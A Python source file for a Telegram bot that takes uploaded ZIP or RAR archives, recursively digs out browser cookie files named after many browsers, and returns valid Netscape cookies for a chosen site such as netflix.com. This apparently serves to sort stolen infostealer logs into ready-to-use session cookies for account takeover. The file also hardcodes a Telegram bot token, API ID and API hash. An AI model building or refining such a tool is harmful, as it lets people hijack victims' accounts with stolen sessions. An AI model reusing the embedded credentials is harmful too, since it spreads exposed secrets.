import os
import re
import time
import asyncio
import zipfile
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from pyrogram import Client, filters, enums
from pyrogram.types import Message

try:
    import rarfile
    RAR_SUPPORTED = True
except ImportError:
    RAR_SUPPORTED = False
    print("⚠️ rarfile not installed - RAR support disabled")

BOT_TOKEN = "8663784484:AAEDaOYGkT8cCnkBvVaCNEp4fjQL3pgDPlQ"
API_ID = 32201838
API_HASH = "5e270d2e3ed53eb5d37c8f8016ff4bcd"

app = Client("cookiebot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

pending_domains = {}
pending_passwords = {}

# ── Cookie filename matching ──────────────────────────────────────────────────
COOKIE_FILENAMES_EXACT = {
    "cookies.txt", "cookies", "cookie.txt", "cookie",
    "network cookies", "network_cookies", "network cookies.txt",
    "chrome_cookies.txt", "firefox_cookies.txt", "chromium_cookies.txt",
    "edge_cookies.txt", "opera_cookies.txt", "default_cookies.txt",
    "brave_cookies.txt", "vivaldi_cookies.txt", "yandex_cookies.txt",
    "all cookies.txt", "all_cookies.txt", "allcookies.txt",
    "cookies (netscape).txt", "cookies_netscape.txt",
    "default cookies.txt", "default_cookies",
    "exported_cookies.txt", "browser_cookies.txt",
}
COOKIE_KEYWORDS = ["cookie"]

def is_cookie_file(fname: str) -> bool:
    fname_lower = os.path.basename(fname).lower().strip()
    if fname_lower in COOKIE_FILENAMES_EXACT:
        return True
    if fname_lower.replace(" ", "_") in COOKIE_FILENAMES_EXACT:
        return True
    for kw in COOKIE_KEYWORDS:
        if kw in fname_lower:
            return True
    return False

def is_archive(fname: str) -> bool:
    lower = fname.lower()
    return lower.endswith('.zip') or lower.endswith('.rar')

# ── Encryption detection ──────────────────────────────────────────────────────
def is_zip_encrypted(zip_path: str) -> bool:
    try:
        with zipfile.ZipFile(zip_path, 'r') as zf:
            for member in zf.infolist():
                if member.flag_bits & 0x1:
                    return True
        return False
    except:
        return False

def is_rar_encrypted(rar_path: str) -> bool:
    if not RAR_SUPPORTED:
        return False
    try:
        with rarfile.RarFile(rar_path, 'r') as rf:
            return rf.needs_password()
    except:
        return False

def is_encrypted(path: str) -> bool:
    if path.lower().endswith('.rar'):
        return is_rar_encrypted(path)
    return is_zip_encrypted(path)

# ── Validate cookie line ──────────────────────────────────────────────────────
def is_valid_netscape_line(parts: list) -> bool:
    if len(parts) < 7:
        return False
    domain, flag, path, secure, expiry, name, value = parts[:7]
    if not domain or '.' not in domain:
        return False
    if flag.upper() not in ('TRUE', 'FALSE'):
        return False
    if not path.startswith('/'):
        return False
    if secure.upper() not in ('TRUE', 'FALSE'):
        return False
    if not expiry.isdigit():
        return False
    if not name or ' ' in name or not name.isprintable():
        return False
    return True

# ── Netscape cookie parser ────────────────────────────────────────────────────
def parse_netscape_cookies(text: str, domain_filter: str):
    domain_filter = domain_filter.strip().lower().lstrip(".")
    results = []
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) < 7:
            parts = re.split(r"\s+", line, maxsplit=6)
        if not is_valid_netscape_line(parts):
            continue
        domain, flag, path, secure, expiry, name, value = parts[:7]
        domain_clean = domain.lower().lstrip(".")
        if domain_filter in domain_clean or domain_clean in domain_filter:
            results.append("\t".join([domain, flag, path, secure, expiry, name, value]))
    return results

# ── Recursive archive collector ───────────────────────────────────────────────
def collect_cookie_files_from_zip(zip_path: str, password: bytes = None, depth: int = 0, max_depth: int = 6):
    results = []
    if depth > max_depth:
        return results
    try:
        with zipfile.ZipFile(zip_path, 'r') as zf:
            for member in zf.infolist():
                if member.is_dir():
                    continue
                fname = member.filename
                basename = os.path.basename(fname)
                if is_archive(basename):
                    try:
                        data = zf.read(member, pwd=password)
                        nested_path = f"/tmp/nested_{depth}_{int(time.time())}_{basename}"
                        with open(nested_path, 'wb') as f:
                            f.write(data)
                        nested = collect_from_archive(nested_path, password, depth + 1, max_depth)
                        results.extend(nested)
                        os.remove(nested_path)
                    except Exception as e:
                        print(f"⚠️ Nested archive error {basename}: {e}")
                elif is_cookie_file(basename):
                    try:
                        content = zf.read(member, pwd=password)
                        results.append((fname, content))
                    except Exception as e:
                        print(f"⚠️ Read error {fname}: {e}")
    except zipfile.BadZipFile:
        print(f"⚠️ Bad ZIP: {zip_path}")
    except Exception as e:
        print(f"⚠️ ZIP open error: {e}")
    return results

def collect_cookie_files_from_rar(rar_path: str, password: str = None, depth: int = 0, max_depth: int = 6):
    results = []
    if not RAR_SUPPORTED or depth > max_depth:
        return results
    try:
        with rarfile.RarFile(rar_path, 'r') as rf:
            if password:
                rf.setpassword(password)
            for member in rf.infolist():
                if member.is_dir():
                    continue
                fname = member.filename
                basename = os.path.basename(fname)
                if is_archive(basename):
                    try:
                        data = rf.read(member)
                        nested_path = f"/tmp/nested_{depth}_{int(time.time())}_{basename}"
                        with open(nested_path, 'wb') as f:
                            f.write(data)
                        nested = collect_from_archive(nested_path, password.encode() if password else None, depth + 1, max_depth)
                        results.extend(nested)
                        os.remove(nested_path)
                    except Exception as e:
                        print(f"⚠️ Nested archive error {basename}: {e}")
                elif is_cookie_file(basename):
                    try:
                        content = rf.read(member)
                        results.append((fname, content))
                    except Exception as e:
                        print(f"⚠️ Read error {fname}: {e}")
    except rarfile.BadRarFile:
        print(f"⚠️ Bad RAR: {rar_path}")
    except Exception as e:
        print(f"⚠️ RAR open error: {e}")
    return results

def collect_from_archive(path: str, password: bytes = None, depth: int = 0, max_depth: int = 6):
    if path.lower().endswith('.rar'):
        pwd_str = password.decode('utf-8', errors='ignore') if password else None
        return collect_cookie_files_from_rar(path, pwd_str, depth, max_depth)
    return collect_cookie_files_from_zip(path, password, depth, max_depth)

def test_archive_password(path: str, password: bytes) -> bool:
    """Test if a password is correct for an archive."""
    try:
        if path.lower().endswith('.rar'):
            with rarfile.RarFile(path, 'r') as rf:
                rf.setpassword(password.decode('utf-8', errors='ignore'))
                first = next(m for m in rf.infolist() if not m.is_dir())
                rf.read(first)
        else:
            with zipfile.ZipFile(path, 'r') as zf:
                first = next(m for m in zf.infolist() if not m.is_dir())
                zf.read(first, pwd=password)
        return True
    except:
        return False

# ── Text handler (password + domain) ─────────────────────────────────────────
@app.on_message(filters.text & ~filters.command("start"))
async def text_handler(client: Client, message: Message):
    uid = message.from_user.id if message.from_user else 0
    if uid in pending_passwords:
        future = pending_passwords.pop(uid)
        if not future.done():
            future.get_loop().call_soon_threadsafe(future.set_result, message.text.strip())
        return
    if uid in pending_domains:
        future = pending_domains.pop(uid)
        if not future.done():
            future.get_loop().call_soon_threadsafe(future.set_result, message.text.strip().lower())

@app.on_message(filters.command("start"))
async def start_handler(client: Client, message: Message):
    rar_status = "✅ RAR supported" if RAR_SUPPORTED else "⚠️ RAR not available"
    await message.reply(
        "**🚀 Cookie Bot READY**\n\n"
        "🔹 Send a ZIP or RAR file\n"
        "🔹 Bot asks for domain\n"
        "🔹 Type `netflix.com`\n"
        "🔹 Receive `NETFLIX_1.txt`, `NETFLIX_2.txt` ...\n\n"
        f"🔐 Password-protected archives supported\n"
        f"📦 {rar_status}\n"
        "✅ Only valid Netscape cookies saved",
        parse_mode=enums.ParseMode.MARKDOWN
    )

@app.on_message(filters.document)
async def doc_handler(client: Client, message: Message):
    doc_name = message.document.file_name if message.document else ""
    doc_lower = doc_name.lower()
    if doc_lower.endswith('.zip') or doc_lower.endswith('.rar'):
        await process_archive(client, message)
    else:
        await message.reply("❌ **ZIP or RAR file only** please!", parse_mode=enums.ParseMode.MARKDOWN)

async def process_archive(client: Client, message: Message):
    doc = message.document
    fname = doc.file_name or "upload.zip"
    filesize = doc.file_size or 0
    uid = message.from_user.id
    is_rar = fname.lower().endswith('.rar')

    if is_rar and not RAR_SUPPORTED:
        await message.reply("❌ **RAR not supported** on this server. Send a ZIP instead.")
        return

    if filesize > 2e9:
        await message.reply("❌ Max 2GB")
        return

    start_time = time.time()
    ext = '.rar' if is_rar else '.zip'
    archive_path = f"/tmp/{uid}_{int(time.time())}{ext}"
    status = await message.reply("⬇️ **Downloading...**")

    # ── Progress bar ──────────────────────────────────────────────────────────
    last_update_time = [time.time()]
    last_update_bytes = [0]

    async def progress(current, total):
        now = time.time()
        elapsed_since_last = now - last_update_time[0]
        if elapsed_since_last < 2.0:
            return
        bytes_since_last = current - last_update_bytes[0]
        speed_bps = bytes_since_last / elapsed_since_last if elapsed_since_last > 0 else 0
        remaining = total - current
        eta = int(remaining / speed_bps) if speed_bps > 0 else 0
        last_update_time[0] = now
        last_update_bytes[0] = current
        pct = current / total * 100
        filled = int(pct / 5)
        bar = "█" * filled + "░" * (20 - filled)
        if speed_bps >= 1_000_000:
            speed_str = f"{speed_bps/1_000_000:.1f} MB/s"
        elif speed_bps >= 1_000:
            speed_str = f"{speed_bps/1_000:.0f} KB/s"
        else:
            speed_str = f"{speed_bps:.0f} B/s"
        eta_str = f"{eta//60}m {eta%60}s" if eta >= 60 else f"{eta}s"
        try:
            await status.edit_text(
                f"⬇️ **Downloading** `{fname}`\n"
                f"`[{bar}]` **{pct:.1f}%**\n"
                f"📦 {current/1e6:.1f} / {total/1e6:.1f} MB\n"
                f"⚡ **{speed_str}** | ⏱️ ETA: **{eta_str}**",
                parse_mode=enums.ParseMode.MARKDOWN
            )
        except: pass

    try:
        await client.download_media(message, file_name=archive_path, progress=progress)
    except Exception as e:
        await status.edit_text(f"❌ **Download failed**: {e}")
        if os.path.exists(archive_path): os.remove(archive_path)
        return

    elapsed = time.time() - start_time
    avg_speed = filesize / elapsed if elapsed > 0 else 0
    avg_str = f"{avg_speed/1_000_000:.1f} MB/s" if avg_speed >= 1_000_000 else f"{avg_speed/1_000:.0f} KB/s"

    # ── Check password ────────────────────────────────────────────────────────
    archive_password = None
    if is_encrypted(archive_path):
        await status.edit_text(
            f"✅ **Downloaded** `{fname}` in {elapsed:.1f}s @ {avg_str}\n\n"
            f"🔐 **Archive is password protected!**\n"
            f"Please send the password now:",
            parse_mode=enums.ParseMode.MARKDOWN
        )
        loop = asyncio.get_event_loop()
        pwd_future = loop.create_future()
        pending_passwords[uid] = pwd_future
        try:
            pwd_text = await asyncio.wait_for(pwd_future, timeout=60)
            archive_password = pwd_text.encode('utf-8')

            if not test_archive_password(archive_path, archive_password):
                await status.edit_text("❌ **Wrong password!** Send the archive again.")
                if os.path.exists(archive_path): os.remove(archive_path)
                return

        except asyncio.TimeoutError:
            pending_passwords.pop(uid, None)
            await status.edit_text("⏰ **Timed out waiting for password.** Send archive again.")
            if os.path.exists(archive_path): os.remove(archive_path)
            return

        await status.edit_text(
            f"✅ **Password correct!**\n\n"
            f"📝 **Send the domain name now:**\n"
            f"Example: `netflix.com` or `instagram.com`",
            parse_mode=enums.ParseMode.MARKDOWN
        )
    else:
        await status.edit_text(
            f"✅ **Downloaded** `{fname}` in {elapsed:.1f}s @ {avg_str}\n\n"
            f"📝 **Send the domain name now:**\n"
            f"Example: `netflix.com` or `instagram.com`",
            parse_mode=enums.ParseMode.MARKDOWN
        )

    # ── Wait for domain ───────────────────────────────────────────────────────
    loop = asyncio.get_event_loop()
    domain_future = loop.create_future()
    pending_domains[uid] = domain_future
    try:
        domain = await asyncio.wait_for(domain_future, timeout=60)
    except asyncio.TimeoutError:
        pending_domains.pop(uid, None)
        await status.edit_text("⏰ **Timed out.** Send archive again.")
        if os.path.exists(archive_path): os.remove(archive_path)
        return

    await status.edit_text(f"🔍 **Scanning for `{domain}` cookies...**")

    domain_prefix = domain.upper().split(".")[0]
    output_zip_path = f"/tmp/{uid}_{domain}_results.zip"
    total_matches = 0
    counter = 1
    scanned = 0

    try:
        cookie_files = collect_from_archive(archive_path, archive_password)
        scanned = len(cookie_files)
        print(f"📁 Found {scanned} cookie files")

        if os.path.exists(archive_path):
            os.remove(archive_path)
            print("🧹 Input archive deleted")

        with zipfile.ZipFile(output_zip_path, 'w', zipfile.ZIP_DEFLATED) as zf_out:
            for (orig_path, content_bytes) in cookie_files:
                try:
                    text = content_bytes.decode('utf-8', errors='ignore')
                    matches = parse_netscape_cookies(text, domain)
                    if matches:
                        out_name = f"{domain_prefix}_{counter}.txt"
                        zf_out.writestr(out_name, "\n".join(matches))
                        print(f"✅ {len(matches)} cookies → {out_name}")
                        total_matches += len(matches)
                        counter += 1
                except Exception as e:
                    print(f"⚠️ Parse error {orig_path}: {e}")

        if total_matches > 0:
            await status.edit_text(
                f"🎉 **{total_matches} valid cookies** for `{domain}`\n"
                f"📁 {scanned} files scanned | 📄 {counter-1} output files\n"
                f"📦 Sending ZIP...",
                parse_mode=enums.ParseMode.MARKDOWN
            )
            await client.send_document(
                message.chat.id,
                document=output_zip_path,
                caption=(
                    f"🍪 **{total_matches} cookies** for `{domain}`\n"
                    f"📄 `{domain_prefix}_1.txt` → `{domain_prefix}_{counter-1}.txt`\n"
                    f"✅ Garbage/binary lines filtered"
                ),
                parse_mode=enums.ParseMode.MARKDOWN
            )
            await status.delete()
        else:
            await status.edit_text(
                f"❌ **No valid cookies** found for `{domain}`\n"
                f"📁 {scanned} files scanned"
            )

    except Exception as e:
        print(f"❌ ERROR: {e}")
        await status.edit_text(f"❌ **Error**: {e}")
        if os.path.exists(archive_path): os.remove(archive_path)

    finally:
        if os.path.exists(output_zip_path):
            os.remove(output_zip_path)
            print("🧹 Output ZIP deleted")

# ── Fake web server for Render ────────────────────────────────────────────────
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
    def log_message(self, *args): pass

def run_server():
    HTTPServer(("0.0.0.0", 10000), Handler).serve_forever()

if __name__ == "__main__":
    print("🚀 Cookie Bot Starting...")
    threading.Thread(target=run_server, daemon=True).start()
    print("✅ Web server on port 10000")
    app.run()
